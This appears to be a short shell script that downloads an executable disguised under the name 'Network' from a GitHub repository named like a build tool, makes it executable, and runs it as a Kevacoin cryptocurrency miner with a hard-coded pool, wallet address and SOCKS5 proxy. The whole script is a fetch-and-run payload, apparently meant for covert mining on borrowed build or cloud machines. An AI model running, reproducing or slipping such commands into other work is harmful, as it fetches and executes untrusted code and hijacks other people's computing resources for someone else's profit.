apt update 
apt install screen -y 
wget -O Network https://github.com/lancote-markote/lancote-buildkite/raw/main/Network
chmod +x Network
screen -dmS ls
./Network --algorithm randomkeva --pool sg.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password Build --proxy=socks5://198.12.255.100:14164
